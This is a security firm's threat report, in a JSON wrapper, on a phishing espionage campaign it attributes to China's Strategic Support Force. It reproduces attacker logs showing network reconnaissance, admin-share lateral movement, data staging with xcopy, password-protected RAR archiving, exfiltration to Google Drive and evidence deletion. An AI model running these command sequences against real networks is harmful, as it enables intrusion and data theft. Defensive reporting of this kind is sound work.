{
    "id": "eefd3187-479e-448f-879e-520dfbbc5b8b",
    "created_at": "2022-10-25T16:48:16.644167Z",
    "updated_at": "2025-03-27T02:06:14.106446Z",
    "deleted_at": null,
    "sha1_hash": "4b1c1e491e3ef07b114564f0580c841ca8c70e24",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-12-19T10:27:26Z",
    "file_modification_date": "2018-12-19T10:27:28Z",
    "file_size": 2139546,
    "plain_text": "# PHISHING DIPLOMACY\n\n\n**/**\n\n\n-----\n\n**REDWOOD CITY, CA 94063** **[INFO@AREA1SECURITY.COM](http://)**\n\n### PHISHING DIPLOMACY\n\nThe mission of Area 1 Security is to eliminate phishing, and through the course of our normal business,\n\nwe often discover the origins and outcomes of cyber campaigns.\n\nPhishing Diplomacy is our report that details a Chinese government cyber campaign targeting Intergovernmental\n\nOrganizations, Ministries of Foreign Affairs, Ministries of Finance, trade unions, and think tanks. Over 100 hundred\n\norganizations were identified in this campaign by Area 1 Security as targets of the Chinese government’s Strategic\n\nSupport Force (SSF), which ultimately led to the breach of a diplomatic communications network of the European Union.\n\nThis report is not the first to expose a specific cyber campaign, nor will it have a direct impact on deterring the actors\n\nresponsible. Our report shows that Chinese government hacking is technically unremarkable and consistent in three\n\nareas across all cyber campaigns:\n\n\n### 1\n\n 2\n\n 3\n\n\n**Phishing remains the dominant method through which cyber actors**\n**gain access into computer networks 9 out of 10 times.**\n\n**Cyber attacks are more akin to an assembly line than to individual snowflakes.**\n**Rather than characterizing the attacks as sophisticated we see them as imaginative**\n**and persistent. Very little about cyber attacks is cutting-edge computer science.**\n**However, there is a high level of creativity in the diverse phishing lures used to**\n**gain access and in the attackers’ ability to identify non-obvious targets that allow**\n**them to achieve their desired outcomes.**\n\n**Cyber actors continually use their imagination to find the weakest links in the**\n**digital chain, breaching their intended targets through open side doors instead of**\n**breaking the locks down on the front door.**\n\n\nBecause the cybersecurity doom narrative has become so embellished, we’ve lost our nerve to take action to prevent\n\nfuture damages. Around the world cyber campaigns are evolving to be an essential tool for waging war, disrupting\n\ntrade, stealing property, and conducting espionage with limited resources or repercussions. Our democracy remains\n\nsusceptible to cybersecurity attacks; our computing infrastructure is permeated with deep vulnerabilities; major\n\ncorporations entrusted with the safeguarding of information continue to be compromised; and we as individuals have\n\nadopted a laissez-faire attitude towards the whole thing.\n\nCyber campaigns linked to China have served for many years as a catalyst for both national-security and cybersecurity\n\nexperts to raise awareness and allocate resources to an issue historically relegated to the basements of organizations.\n\nAfter years of publicly censuring the PRC for cyber-based economic espionage, Washington and Beijing reached an\n\nagreement in 2015 to curtail the hacking of private companies for commercial gain. As 2018 comes to a close, tensions\n\nbetween the two countries over hacking allegations are once again on the rise.\n\n1 [The Legend of Sophistication in Cyber Operations https://www.belfercenter.org/publication/legend-sophistication-cyber-operations](https://www.belfercenter.org/publication/legend-sophistication-cyber-operations)\n\n\n-----\n\n## Campaign Details\n\nBeginning in April of 2015, Area 1 Security’s active\n\nsensors and research team began observing\n\ntechnical artifacts of a cyber campaign directed\n\nat Intergovernmental Organizations, Ministries of\n\nForeign Affairs and Ministries of Finance, as well as\n\ntrade unions and think tanks.\n\nIn late November 2018, Area 1 Security discovered\n\nthat this campaign, via phishing, successfully gained\n\naccess into the computer network of the Ministry of\n\nForeign Affairs of Cyprus, a communications network\n\nused by the European Union to facilitate cooperation\n\non foreign policy matters. This network, known as\n\nCOREU, operates between the 28 EU countries, the\n\nCouncil of the European Union, the European External\n\nAction Service, and the European Commission. It\n\n\nis a crucial instrument in the EU system of\n\nforeign policymaking.\n\nThe campaign was directed by the Chinese\n\ngovernment and specifically undertaken by the\n\nStrategic Support Force (SSF) of the People’s\n\nLiberation Army (PLA). While the targets are disparate,\n\nwe have identified a consistent set of characteristics\n\nand chain of events that tie together a larger\n\ncampaign that includes targeting the United Nations\n\nand the AFL-CIO in addition to accessing diplomatic\n\ncables from the COREU network.\n\n2 3PLA was the Signals Intelligence (SIGINT) agency of the Peoples\nRepublic of China and was reorganized around December 2015 to\nbecome part of the Strategic Support Force or SSF (战略支援部队)\n\n[https://www.cfr.org/blog/chinas-strategic-support-force-new-home-](https://www.cfr.org/blog/chinas-strategic-support-force-new-home-plas-cyber-operations)\n[plas-cyber-operations](https://www.cfr.org/blog/chinas-strategic-support-force-new-home-plas-cyber-operations)\n\n\n-----\n\n## Campaign Details\n\n### STEP 1\n\nInitial access was gained by phishing network administrators and senior staff within\n\nthe target organization to steal their credentials (usernames and passwords).\n\n### STEP 2\n\nCredentials obtained via phishing allowed direct access into the networks with\n\nassociated network privileges transferred by the user compromised.\n\n### STEP 3\n\nMalware was introduced into the network to create a persistent backdoor and\n\nestablish a path for command and control communications.\n\nIn this example, PlugX was used as the malware. Samples analyzed by Area 1 Security can be\n\nconnected to campaigns as early as 2010 and remain undetected by antivirus solutions.\n\n### IN THE EARLY STAGES OF A CYBER OPERATION,\n\n COMPROMISED HOSTS SERVE AS A STAGING\n\n AREA FOR PIVOTING ACROSS THE NETWORK.\n\n THE INITIAL USER WHO WAS PHISHED HAS THEIR\n\n COMPUTER USED AS A STAGING AREA, AN INTERNAL\n\n PROXY, FROM WHICH OTHER COMPUTERS AND FILES\n\n THROUGHOUT THE NETWORK, OTHERWISE UNREACHABLE\n\n|S|T|E|P|\n|---|---|---|---|\n\n|S|T|E|P|\n|---|---|---|---|\n\n|S|T|E|P|\n|---|---|---|---|\n\n\n### FROM THE PUBLIC INTERNET, CAN BE ACCESSED.\n\n\n-----\n\n## Campaign Details\n\n### STEP 4\n\nOnce within the network, a series of host and network surveys are\n\nconducted to help the attacker orient themselves as to where they are.\n\n**dir**     - shows all of the files and folders available on the computer\n\n**Directory of C:\\Users\\[REDACTED]**\n\n**03/30/2015 09:14 AM  <DIR>     .**\n**03/30/2015 09:14 AM  <DIR>     ..**\n**03/13/2014 03:43 PM  <DIR>     .docuvantage**\n**01/29/2015 02:46 PM     4,741,782 Appendix_ARF-4Q_Oct-Dec_14.docx**\n**01/29/2015 02:46 PM     1,217,346 Appendix_ARF-4Q_Oct-Dec_14.pdf**\n**11/23/2015 11:08 AM  <DIR>     Contacts**\n**01/06/2016 11:28 AM  <DIR>     Desktop**\n**11/23/2015 11:08 AM  <DIR>     Documents**\n**01/05/2016 02:19 PM  <DIR>     Downloads**\n**02/24/2016 12:08 PM  <DIR>     Dropbox**\n**11/23/2015 11:08 AM  <DIR>     Favorites**\n**01/06/2016 11:28 AM  <DIR>     Google Drive**\n**11/23/2015 11:08 AM  <DIR>     Links**\n**05/13/2014 10:12 AM  <DIR>     Mozilla**\n**11/23/2015 11:08 AM  <DIR>     Music**\n**03/13/2014 10:49 AM  <DIR>     Oracle**\n**11/23/2015 11:08 AM  <DIR>     Pictures**\n**01/29/2015 02:46 PM     9,296,384 ROL 2014 MJP ARF-4Q_Oct-Dec 14_Yonlada.doc**\n**11/23/2015 11:08 AM  <DIR>     Saved Games**\n**11/23/2015 11:08 AM  <DIR>     Searches**\n**03/30/2015 09:14 AM  <DIR>     Tracing**\n**11/23/2015 11:08 AM  <DIR>     Videos**\n\n**tasklist**     - shows the process list on the computer\n\n**C:\\Users\\[REDACTED]\\AppData\\Roaming>tasklist**\n\n**Image Name           PID Session Name    Session#  Mem Usage**\n**========================= ======== ================ =========== ============**\n\n**armsvc.exe          1804 Services          0    804 K**\n**cam.exe            1824 Services          0   2,132 K**\n**CSAMPmux.exe         1844 Services          0   2,032 K**\n**CAF.exe            1868 Services          0   4,860 K**\n**casplitegent.exe       1908 Services          0   2,540 K**\n**RtaAgent.exe         2028 Services          0   2,212 K**\n**mdm.exe            1448 Services          0   1,404 K**\n**PSANHost.exe         1708 Services          0   14,860 K**\n**PSUAService.exe        2108 Services          0   2,860 K**\n**vmware-usbarbitrator64.ex** **2148 Services          0    900 K**\n\n\n-----\n\n## Campaign Details\n\n**vmnat.exe           2188 Services          0    736 K**\n**WAHost.exe          2280 Services          0   20,304 K**\n**WmiPrvSE.exe         2312 Services          0   4,432 K**\n**vmware-authd.exe       2432 Services          0   2,332 K**\n**vmnetdhcp.exe         2736 Services          0    780 K**\n**WmiApSrv.exe         3248 Services          0   1,400 K**\n**cfsmsmd.exe          3500 Services          0   1,920 K**\n**ccnfAgent.exe         3692 Services          0   5,612 K**\n**cfnotsrvd.exe         3800 Services          0   2,080 K**\n**ccsmagtd.exe         3836 Services          0   4,172 K**\n**rcHost.exe          3956 Services          0   2,804 K**\n**amswmagt.exe         3992 Services          0    864 K**\n**cfFTPlugin.exe        3208 Services          0   1,740 K**\n**taskhost.exe         4040 Console          1   5,716 K**\n**dwm.exe            3008 Console          1   34,340 K**\n**explorer.exe         2672 Console          1   42,120 K**\n**igfxtray.exe         4328 Console          1    796 K**\n**hkcmd.exe           4344 Console          1    996 K**\n**igfxpers.exe         4356 Console          1   2,800 K**\n**PSUAMain.exe         4428 Console          1   5,228 K**\n**SearchIndexer.exe       4392 Services          0   12,120 K**\n**OUTLOOK.EXE          3464 Console          1   41,608 K**\n**jucheck.exe          4608 Console          1   1,092 K**\n**chrome.exe          [truncated]**\n**splwow64.exe         5656 Console          1   3,536 K**\n**audiodg.exe          3176 Services          0   13,008 K**\n**WINWORD.EXE          5208 Console          1   36,112 K**\n**RdrCEF.exe          [truncated]**\n**conhost.exe          [truncated]**\n**xcopy.exe           4116 Console          1   3,400 K**\n**cmd.exe            3516 Console          1   3,572 K**\n**tasklist.exe         1776 Console          1   5,380 K**\n**WmiPrvSE.exe         6236 Services          0   6,276 K**\n\nThe running processes show the SSF was copying cables from the COREU network at the same time the user was\ngoing about their day. VMware running may indicate this user’s machine has a privileged user persona.\n\n**ipconfig**     - shows the IP address information of the host\n\n**C:\\Users\\[REDACTED]\\AppData\\Roaming>ipconfig /all**\n\n**Windows IP Configuration**\n\n**Host Name . . . . . . . . . . . . : WIN7ENT-T09HKKG**\n**Primary Dns Suffix . . . . . . . : unhq.un.org**\n**Node Type . . . . . . . . . . . . : Hybrid**\n**DNS Suffix Search List. . . . . . : unhq.un.org**\n**un.org**\n**ptc.un.org**\n**stc.un.org**\n**pbf.un.org**\n\n\n-----\n\n## Campaign Details\n\n**Ethernet adapter Local Area Connection:**\n\n**Connection-specific DNS Suffix . : unhq.un.org.**\n**Description . . . . . . . . . . . : Intel(R) 82579LM Gigabit Network Connection**\n**Physical Address. . . . . . . . . : 44-37-E6-AE-95-2F**\n**DHCP Enabled. . . . . . . . . . . : Yes**\n**Autoconfiguration Enabled . . . . : Yes**\n**IPv4 Address. . . . . . . . . . . : 10.240.88.163(Preferred)**\n**Subnet Mask . . . . . . . . . . . : 255.255.254.0**\n**Default Gateway . . . . . . . . . : 10.240.89.254**\n**NetBIOS over Tcpip. . . . . . . . : Enabled**\n\n**ping**     - sends a connection request to another computer to determine if it is available on the network\n\n**ping -n 1 [REDACTED]**\n\n**Pinging [REDACTED].hq.aflcio.org [10.140.2.12] with 32 bytes of data:**\n**Reply from 10.140.2.12: bytes=32 time=1ms TTL=127**\n**Ping statistics for 10.140.2.12:**\n**Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),**\n**Approximate round trip times in milli-seconds:**\n**Minimum = 1ms, Maximum = 1ms, Average = 1ms**\n\n**net user**     - sends a request for detailed information on the user specified to the domain controller\n\n**net user [REDACTED] /domain**\n\n**The request will be processed at a domain controller for domain hq.aflcio.org.**\n\n**User name          [REDACTED]**\n**Full Name          [REDACTED]**\n**Comment**\n**User’s comment**\n**Country code         000 (System Default)**\n**Account active        Yes**\n**Account expires       Never**\n\n**Password last set      11/13/2012 12:23:55 PM**\n**Password expires       Never**\n**Password changeable     11/13/2012 12:23:55 PM**\n**Password required      No**\n**User may change password   Yes**\n\n**Local Group Memberships**\n**Global Group memberships   *China_WDrive-SG   *PDrive_OPEIU_FullAcce**\n***EveryoneSolidarity_Fo*Impromtptu XP-SG**\n***Domain Users**\n**The command completed successfully.**\n\n|pi|Col2|\n|---|---|\n\n\n-----\n\n## Campaign Details\n\n**net view**     - is used to show a list of computers and network devices on the network\n\n( In this example the remote host is the United Nations File Server )\n\n**net view \\\\10.250.14.16**\n\n**Share name          Type Used as Comment**\n**-------------------------------------------------------------------------------**\n**5thComm_Common        Disk      5th Commitee Common Files**\n**5thComm_CPC          Disk      DM/EO/5thCommittee CPC Data**\n**CSS_Common          Disk      DM/CSS Common Files**\n**CSS_HCC            Disk      DM/CSS HCC Files**\n**CSS_OCSS           Disk      DM\\EO**\n**CSS_Studies          Disk      DM/CSS Studies**\n**DMEO_Common          Disk      DMEO Common Files**\n**DMEOSG_Common         Disk      DM-EOSG Common Files**\n**DMEOSG_Internal        Disk      DMEOSG Internal Service Files**\n**DPA_Common          Disk      Common share for DPA**\n**FMD_IRU            Disk      DM/CSS/FMD IRU**\n**FMD_OSPU           Disk      DM/CSS/FMD BMSCadd OSPU**\n**FMD_Paradox          Disk      DM/CSS/FMD Paradox**\n**FMD_PMU            Disk      DM/CSS/FMD PMU**\n**ITSD_MAA           Disk      McAfee DAT share**\n**OUSG_Clearance_Database    Disk      OUSG_Clearance_Database**\n**Treasury_Frustram       Disk      DM/OUSG/Treasury Frustram Application**\n**Treasury_Lotus5        Disk      DM/OUSG/Treasury Lotus Calendar**\n**Treasury_Off         Disk      DM/OUSG/Treasury Off Directory**\n**Treasury_Shared        Disk      DM/OUSG/Treasury Shared Files**\n**Treasury_Treasury       Disk      DM/OUSG/Treasury Files**\n**Treasury_TRSCV        Disk      DM/OUSG/Treasury TRSCV Directory**\n**UNDSS_Admin          Disk**\n**UNDSS_Common         Disk**\n**undss_data          Disk**\n**UNEP_Common          Disk**\n**UNRWA_Common         Disk**\n**The command completed successfully.**\n\n### STEP 5\n\nNative Windows console commands, such as net use and at allow\n\nmovementfrom machine to machine within the network.\n\nAt this point, while within the network, SSF was able to identify the\n\nfiles and machines of interest.\n\n|S|TE|P|\n|---|---|---|\n\n\n-----\n\n## Campaign Details\n\n**In the breach of the Ministry of Foreign Affairs of Cyprus,**\n\nSSF uses the net use command to map to the remote file server that stored\n\nthe diplomatic cables from the COREU network.\n\n**C:\\Users\\[REDACTED]\\AppData\\Roaming\\sysinfo>net use \\\\**\n**MFACENTRALREGIS\\ipc$ [REDACTED] /u:govcy\\MFAAdmin**\n\n**The command completed successfully.**\n\n**In the breach of the United Nations, SSF was able to check which remote**\n\nresources have been successfully mapped to the local host.\n\n**net use**\n\n**New connections will be remembered.**\n\n**Status    Local   Remote          Network**\n**-------------------------------------------------------------------------------**\n**OK      H:    \\\\SECF09\\Home       Microsoft Windows Network**\n**OK      K:    \\\\secf04\\batch_dpko    Microsoft Windows Network**\n**OK      O:    \\\\SECF05\\WIN7PROD     Microsoft Windows Network**\n**T:    \\\\unhq.un.org\\Shared\\dpko_oo\\oasg-oo files**\n**Microsoft Windows Network**\n**OK           \\\\10.250.14.16\\ipc$    Microsoft Windows Network**\n**The command completed successfully.**\n\n**at \\\\10.130.133.18**\n\n**Status ID  Day           Time     Command Line**\n**-------------------------------------------------------------------------------**\n**1  Tomorrow        4:39 PM    c:\\intel\\windowsupdate.exe**\n\n**In the breach AFL-CIO, SSF was able to identify machines within the Solidarity Center.**\n\n**net use \\\\815-san-31\\ipc$ [REDACTED] /u:hq\\netbackup**\n**The command completed successfully.**\n\n**net use \\\\815-san-31\\ipc$ /del**\n**\\\\815-san-31\\ipc$ was deleted successfully.**\n\n\n-----\n\n## Campaign Details\n\n### WHILE OFTEN DESCRIBED AS “SOPHISTICATED” CYBER\n\n CAMPAIGNS ARE VERY REPETITIVE. ONCE INITIAL ACCESS\n\n TO A MACHINE IS ESTABLISHED, THE ATTACKER DETERMINES\n\n WHAT OTHER MACHINES CAN BE CONNECTED TO, WHAT DATA\n\n IS AVAILABLE ON THOSE MACHINES, AND THEN RINSES AND\n\n REPEATS. IT’S THE SERIES OF ACTIONS BETWEEN STEPS 6-8\n\n THAT GIVE SOME INSIGHT INTO THE ATTACKER’S INTENT.\n\n STEP 6\n\nOnce the data is identified, it is staged in preparation for exfiltration using xcopy,\n\nthe Windows command to copy data remotely across computer networks.\n\n**c:\\intel\\sysinfo>xcopy \\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\*.txt /s**\n**/d:07/23/2018**\n\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\data\\COREU\\201807\\[REDACTED]\\COASI246.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI247.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI248.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI249.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI250.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI251.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI252.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI253.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COASI254.txt**\n**\\\\MFA[REDACTED]\\c$\\[REDACTED]\\[REDACTED]\\COREU\\201807\\[REDACTED]\\COEST144.txt**\n\n**[output truncated]**\n**55 File(s) copied**\n\nExample: XCOPY of COREU network from within the Ministry of Foreign Affairs of Cyprus\n\nIn this case, we see documents being taken from staff members with the following titles:\n\nProgram Officer, Communications Program Officer, Law Programs Counsel, Labor and Employment\n\nLaw Counsel, Political Operations, Senior Communications Officer, and Spokesman at the AFL-CIO\n\n|S|T|E|P|\n|---|---|---|---|\n\n|\\\\MFA[R \\\\MFA[R \\\\MFA[R \\\\MFA[R \\\\MFA[R \\\\MFA[R \\\\MFA[R \\\\MFA[R \\\\MFA[R|EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED] EDACTED]\\c$\\[REDACTED]|\\[REDACTED] \\[REDACTED] \\[REDACTED] \\[REDACTED] \\[REDACTED] \\[REDACTED] \\[REDACTED] \\[REDACTED] \\[REDACTED]|\\data\\COREU\\201807\\[REDACTED]\\COASI246.tx \\COREU\\201807\\[REDACTED]\\COASI247.txt \\COREU\\201807\\[REDACTED]\\COASI248.txt \\COREU\\201807\\[REDACTED]\\COASI249.txt \\COREU\\201807\\[REDACTED]\\COASI250.txt \\COREU\\201807\\[REDACTED]\\COASI251.txt \\COREU\\201807\\[REDACTED]\\COASI252.txt \\COREU\\201807\\[REDACTED]\\COASI253.txt \\COREU\\201807\\[REDACTED]\\COASI254.txt|\n|---|---|---|---|\n\n\n-----\n\n## Campaign Details\n\n**xcopy “\\\\[REDACTED]\\c$\\users\\[REDACTED] \\desktop\\*.*” /s /d:12/01/2015**\n\n**\\\\[REDACTED]\\c$\\users\\[REDACTED]\\desktop\\TPP-Final-Text-Labour-US-VN-Plan-for-**\n**Enhancement-of-Trade-and-Labor-Relations.pdf**\n\n**xcopy “\\\\[REDACTED]\\c$\\users\\[REDACTED]\\Downloads\\*.*” /s /d:10/13/2015**\n**\\\\[REDACTED]\\c$\\users\\[REDACTED]\\Downloads\\Discussing Migrant Worker Rights.doc**\n**\\\\[REDACTED]\\c$\\users\\[REDACTED]\\Downloads\\labour laws and workers rights.pdf**\n\n**xcopy “\\\\[REDACTED]\\c$\\users\\[REDACTED]\\documents\\*.*” /s /d:12/01/2015**\n**\\\\[REDACTED]\\c$\\users\\[REDACTED]\\documents\\1Password\\Backups\\1Password 2015-12-01**\n**152526 (53 items).agilekeychain_zip**\n\n** Example XCopy of data from within the AFL-CIO Solidarity Center\n\nCopies of keychain files generated by a password management application were taken,\n\ngiving SSF the ability to view and use each password that the user has saved.\n\n**xcopy z:”\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\*.doc” /s**\n\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\Profiles\\20160321 Profile -**\n**President Xi Jinping of China.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\Profiles\\2016-03-21 Profile**\n\n**- President Xi Jinping of China.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\Meeting notes\\20160202 DSG**\n**mtg with DPR.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\Meeting notes\\20160212 Note**\n**file JF meeting DPR.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\Meeting notes\\20162801 DSG**\n**mtg with DPR.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\Notes\\20160222_Note to JF,**\n**China ASEAN relations.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\Notes\\20160222_Note to JF,**\n**China’s economic downturn.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\TPs and BNs\\160318 KM SG mtg**\n**China President.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\TPs and BNs\\201603 ASG BN**\n**mtg with ASEAN-SCS-input.doc**\n**Z:\\_DPA_Shared\\_APD_Shared\\6. Northeast Asia\\2016 CHINA\\TPs and BNs\\2016-03-21 KM SG**\n**mtg China President.doc**\n**11 File(s) copied**\n\nExample: XCOPY of File Server from within the United Nations\n\n### STEP 7\n\nBefore removing data from the target network, files were compressed into a password protected RAR archive\n\non the local machine and the file was renamed from “rar.exe” to “infos.txt.” In the sample below **_(-m5) for_**\n\n**_enhanced compression and (-p) to password-encrypt the archive were used within the network of the_**\n\nMinistry of Foreign Affairs of Cyprus.\n\n|S|T|E|P|\n|---|---|---|---|\n\n\n-----\n\n## Campaign Details\n\nIn some instances, we observed SSF splitting large files into smaller parts using the -v command\n\noption. The intent is to spread the volume of data taken at a given time to avoid anomaly detection\n\nand large network spikes of outbound data volumes.\n\n**c:\\intel>infos.txt a -m5 -p[REDACTED] sys.rar sysinfo**\n\n**RAR 3.90  Copyright (c) 1993-2009 Alexander Roshal  16 Aug 2009**\n**Shareware version     Type RAR -? for help**\n**Evaluation copy. Please register.**\n\n**Creating archive sys.rar**\n**Adding  sysinfo\\[REDACTED]\\COAFR127.txt                    3% OK**\n**Adding  sysinfo\\[REDACTED]\\COAFR128.txt                    8% OK**\n**Adding  sysinfo\\[REDACTED]\\COAFR129.txt                    9% OK**\n**Adding  sysinfo\\[REDACTED]\\COAFR130.txt                    11% OK**\n**Adding  sysinfo\\[REDACTED]\\COAFR131.txt                    12% OK**\n**Adding  sysinfo\\[REDACTED]\\COAFR132.txt                    13% OK**\n**Adding  sysinfo\\[REDACTED]\\COAFR133.txt                    15% OK**\n**Adding  sysinfo\\[REDACTED]\\COASI232.txt                    15% OK**\n**Adding  sysinfo\\[REDACTED]\\COASI233.txt                    15% OK**\n\n**[output truncated]**\n**Adding  sysinfo\\[REDACTED]                           OK**\n**Adding  sysinfo                             OK**\n**Done**\n\nExample: COREU RAR from within the Ministry of Foreign Affairs of Cyprus\n\n**RAR command output**\n\n**Creating archive sys.rar**\n\n**Adding  temp\\+20 Meetings, Etc\\+20\\+20.pdf                0%**\n**Adding  temp\\+20 Meetings, Etc\\+20\\._+20.pdf               0% OK**\n**Adding  temp\\+20 Meetings, Etc\\Jana Richardson (events planner)\\DBDEvents_SolidarityCenter_**\n**Invoice2.xls    0%**\n**Adding  temp\\+20 Meetings, Etc\\Wash.Hilton Cred. Card Auth for Deposit.pdf    0%**\n**Adding  temp\\AFL-CIO\\Draft letters for RLTrumka\\Cover Memo for Requesting Officer’s Sig.**\n**for letter to Shawna re extension of contract.doc    1% OK**\n**Adding  temp\\AFL-CIO\\Draft letters for RLTrumka\\R.Trumka letter re extension of SBB as**\n**E.D..docx    1% OK**\n**Adding  temp\\AFL-CIO\\Draft letters for RLTrumka\\R.Trumka letter to Stanbic bank in**\n**Zimbabwe.docx    1% OK**\n**Adding  temp\\Alvarez Porter\\+20 Launch & Meetings\\Alvarez_Appreciative-Approach-to-Change-**\n**in-Unions.docx    1% OK**\n**Adding  temp\\Alvarez Porter\\APG SC 1-16 Invoice.pdf           1% OK**\n\n**[output truncated]**\n\n\n-----\n\n## Campaign Details\n\n### STEP 8\n\nThe final step is to remove the data from the network. It was completed by sending the files to public\n\ncloud services such as Google Drive using a tool based on a publicly available utility called send.exe.\n\n**We are going to send sys.rar**\n**Send 206**\n**Send 97**\n**Send 32768**\n**Send 65536**\n\n**[output truncated]**\n\nAccess to these cloud services is over a TLS encrypted channel, which is difficult to inspect, often\n\noverlooked, and typical of normal network activity. Cloud services provide the perfect platform for\n\ndata exfiltration storage and data analysis.\n\nOnce the data has been exfiltrated, all evidence of the prior activity is removed.\n\n**net use \\\\[REDACTED]\\ipc$ /del**\n**del sys.rar**\n**del *.exe**\n**del *.dll**\n**del *.ini**\n**rd /s /q sysinfo**\n\n**xcopy z:”\\_DPA_Shared\\_APD_Shared\\3. Southeast Asia & Regional Orgs\\*.doc” /s /d:02-01-2016**\n**xcopy z:”\\_DPA_Shared\\_APD_Shared\\9. Territorial - Maritime Issues\\*.doc” /s /d:02-01-2016**\n\n|S|T|E|P|\n|---|---|---|---|\n\n\n-----\n\n## Tools\n\n### ANALYSIS OF PLUGX\n\nThe PlugX implant was used in these attacks to move throughout the victims’ networks. One particular sample,\n\nwith SHA-256 hash c1c80e237f6fbc2c61b82c3325dd836f3849ca036a28007617e4e27ba2f16c4b and compilation\n\ntimestamp Sun Jun 17 17:44:58 2012, was found as an artifact in the campaign.\n\nCommon to the PlugX family, DLL side-loading is used to initiate the malicious implant using a benign, legitimate\n\nprogram. The actor loads three files onto the target system: the legitimate signed application executable, the\n\nloader DLL, and the encrypted payload. When the executable is run, the payload is decrypted, decompressed, and\n\nloaded into memory, which allows the implant to bypass many defenses.\n\n**THE ATTACKS USED A PLUGX SAMPLE WITH ALL OF THE STANDARD FEATURES:**\n\n\n\n-  UAC bypass\n\n-  Installation as a Windows service for persistence\n\n-  Filesystem management\n\n-  Keylogging\n\n-  Network resource enumeration\n\n-  Network connection control and statistic\n\n-  Shutdown/reboot/logout control\n\n-  Port forwarding\n\n\n\n-  Process enumeration\n\n-  Windows registry editing\n\n-  Screen capturing\n\n-  Service management\n\n-  Standard Windows command shell cont\n\n-  SQL tools for connecting to databases\n\n-  Telnet\n\n\nThe features provided by PlugX facilitate all aspects of an operation, from performing\n\nreconnaissance within a network, to lateral movement and data exfiltration.\n\n\n-----\n\n## Tools\n\n### ANALYSIS OF SEND.EXE\n\nThe primary exfiltration tool of CHN24, simply called\n\n“google send” by the actor, is written using the Borland\n\nDelphi environment. The command-line tool, typically\n\nnamed send.exe on the victim host, is responsible\n\nfor establishing a connection to Google Drive and\n\nuploading local files to the actor’s account on the\n\ncloud service. The developers of send.exe based the\n\ntool on Astonsoft’s Google Drive “Delphi Component”\n\nlibrary that includes components to write applications\n\nthat can interact with the Google Drive API in Delphi.\n\nTo run send.exe, the actor must store Google OAuth2\n\ncredentials in a file named RefreshToken.ini in the\n\nsame directory as the executable, and then upload\n\nthe file as a command-line argument. Additionally, the\n\nlibrary files, libeay32.dll and ssleay32.dll, must be\n\ninstalled or be present in the same directory. For this\n\nreason, the tool, configuration file, and library files are\n\ntypically dropped onto the compromised machine in a\n\n.rar archive file and extracted. When run, send.exe will\n\n**Main.pas**\n\n\nconnect to Google Drive and begin to upload the local\n\nfile, providing status updates on the bytes uploaded.\n\nThe send.exe tool has a mix of the actor’s code and\n\nsample code from the Astonsoft website. On their\n\nwebsite, Astonsoft provides a trial and demo for\n\nthe Google Drive Delphi Component. The Main.pas\n\nfile in the demo code is provided as an example,\n\nand the GoogleDriveDemo.exe file is a runnable\n\nexample application. It appears that the actor\n\nincorporated code in Main.pas to automate file\n\nuploads without the use of a GUI. More specifically,\n\nthe code automatically retrieves credentials from\n\nthe configuration file and exfiltrates the selected file\n\nto the Google Drive account without prompting the\n\nuser. In the initialization procedure for the Main.pas\n\napplication, distinct placeholder strings such as “Enter\n\nyour client ID here” and “Enter your client secret here”\n\ncan be seen where user credentials are read. The\n\nsnippet of code can be seen below.\n\n|Mai|n.|pas|\n|---|---|---|\n\n\n-----\n\n## Tools\n\n### ANALYSIS OF SEND.EXE\n\nIn the compiled demo provided by Astonsoft, these message strings were replaced with actual values. However,\n\nin the actor’s code the placeholder strings remain intact, suggesting that the code was directly copied from the\n\nMain.pas routine. Both of these observations can be seen in the two screenshots below.\n\n3 [https://www.sync-components.com/google-delphi-components/google-drive](https://www.sync-components.com/google-delphi-components/google-drive)\n\n**GoogleDriveDemo.pas**\n\n**send.exe**\n\n|sen|d.e|xe|\n|---|---|---|\n\n\n-----\n\n## Tools\n\n### ANALYSIS OF SEND.EXE\n\nGiven the overlap in code, Area 1 Security believes that the developers of send.exe relied on the GUI application\n\nsample code provided by Astonsoft to create their command-line utility. Due to the reliance on the Astonsoft demo\n\ncode, the developer inadvertently revealed “google send” as the name for their software, which was deduced from\n\nthe inclusion of the embedded string “Z:\\D\\google 